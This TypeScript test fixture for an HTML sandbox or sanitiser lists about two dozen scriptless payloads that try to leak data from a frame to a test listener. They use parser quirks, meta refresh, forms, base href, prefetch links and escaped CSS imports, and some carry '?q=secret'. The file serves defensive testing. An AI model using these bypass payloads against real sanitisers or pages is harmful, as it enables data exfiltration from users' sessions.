// Views written to get something out of the frame without a script. Each
// address points at `leak` (an http: listener) or `tls` (a listener that
// stands in for an https: server: any connection to it counts) under a path
// named after the case. Shared by the unit tests and scripts/sandbox-check.mjs.

export interface HostileCase {
  name: string;
  html: string;
}

const entities = (s: string) => [...s].map((c) => `&#${c.codePointAt(0)};`).join("");
const GIF = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==";

export function hostileCases(leak: string, tls: string): HostileCase[] {
  const at = (name: string) => `${leak}/${name}`;
  return [
    { name: "slash-attribute", html: `<a/href="${at("slash-attribute")}?q=secret">click</a>` },
    { name: "meta-gt-in-value", html: `<meta name=">" http-equiv="refresh" content="0;url=${at("meta-gt-in-value")}?q=secret">` },
    { name: "newline-attribute", html: `<a\nhref="${at("newline-attribute")}">click</a>` },
    { name: "uppercase", html: `<A HREF="${at("uppercase")}">CLICK</A><IMG SRC="${at("uppercase")}/img"><META HTTP-EQUIV="REFRESH" CONTENT="0;URL=${at("uppercase")}/meta">` },
    { name: "mixed-case", html: `<a HrEf="${at("mixed-case")}">click</a><iMg sRc="${at("mixed-case")}/img"><LiNk ReL=stylesheet hReF="${at("mixed-case")}/css">` },
    { name: "svg-xlink", html: `<svg width="200" height="40"><a xlink:href="${at("svg-xlink")}"><text x="5" y="25">svg link</text></a><a href="${at("svg-xlink")}/href"><rect x="120" y="5" width="60" height="30"/></a></svg>` },
    { name: "area-map", html: `<img src="${GIF}" usemap="#m" width="200" height="40"><map name="m"><area shape="rect" coords="0,0,200,40" href="${at("area-map")}"></map>` },
    { name: "form-submit", html: `<form action="${at("form-submit")}" method="get"><input name="q" value="secret"><button type="submit">send</button><input type="submit" value="go"><button formaction="${at("form-submit")}/formaction">fa</button></form>` },
    { name: "meta-unquoted", html: `<meta http-equiv=refresh content=0;url=${at("meta-unquoted")}>` },
    { name: "base-href", html: `<base href="${at("base-href")}/"><a href="relative">relative link</a><img src="relative.png">` },
    { name: "link-prefetch", html: `<link rel=prefetch href="${at("link-prefetch")}"><link rel=preload as=image href="${at("link-prefetch")}/preload"><link rel=dns-prefetch href="${at("link-prefetch")}/dns"><link rel=stylesheet href="${at("link-prefetch")}/css">` },
    { name: "img-https", html: `<img src="${tls}/img-https"><img srcset="${at("img-https")}/srcset 1x"><img src="${at("img-https")}/http">` },
    { name: "object-data", html: `<object data="${at("object-data")}"></object><embed src="${at("object-data")}/embed"><iframe src="${at("object-data")}/iframe"></iframe>` },
    { name: "css-background", html: `<div style="background:url(${at("css-background")});width:60px;height:20px">bg</div><div style="background:u\\72l(${at("css-background")}/escaped);width:60px;height:20px">bg</div><style>p{background-image:image-set("${at("css-background")}/image-set" 1x)}</style><p>p</p>` },
    { name: "css-import", html: `<style>@import url(${at("css-import")});@import "${at("css-import")}/string";@\\69mport "${at("css-import")}/escaped";</style><p>import</p>` },
    { name: "entity-address", html: `<a href="${entities(at("entity-address"))}">entity link</a><img src="${entities(at("entity-address"))}/img">` },
    { name: "unclosed-comment", html: `<!--><a href="${at("unclosed-comment")}">after a short comment</a>--><!-- <a href="x"> --!><a href="${at("unclosed-comment")}/bang">bang</a><!-- never closed <a href="${at("unclosed-comment")}/never">` },
    { name: "noscript-template", html: `<noscript><p title="</noscript><a href='${at("noscript-template")}'>noscript link</a>"></p></noscript><template><a href="${at("noscript-template")}/template">t</a></template><a href="${at("noscript-template")}/after">after</a>` },
    { name: "foreign-content", html: `<svg><style><a href="${at("foreign-content")}">in svg style</a></style></svg><math><mtext><table><mglyph><style><img src="${at("foreign-content")}/mglyph">` },
    { name: "raw-text", html: `<textarea><a href="${at("raw-text")}">ta</a></textarea><xmp><a href="${at("raw-text")}/xmp">x</a></xmp><title><a href="${at("raw-text")}/title"></title>` },
    { name: "targets", html: `<a href="${at("targets")}/top" target="_top">top</a> <a href="${at("targets")}/parent" target="_parent">parent</a> <a href="${at("targets")}/blank" target="_blank">blank</a> <a href="${tls}/targets">https</a>` },
    { name: "other-addresses", html: `<a ping="${at("other-addresses")}/ping" href="#x">ping</a><video poster="${at("other-addresses")}/poster" src="${at("other-addresses")}/video"></video><svg><image href="${at("other-addresses")}/svg-image"/><use href="${at("other-addresses")}/use#x"/></svg><table background="${at("other-addresses")}/table"><tr><td>t</td></tr></table><input type="image" src="${at("other-addresses")}/input">` },
    { name: "refresh-https", html: `<meta http-equiv="refresh" content="0; url='${tls}/refresh-https'">` },
  ];
}
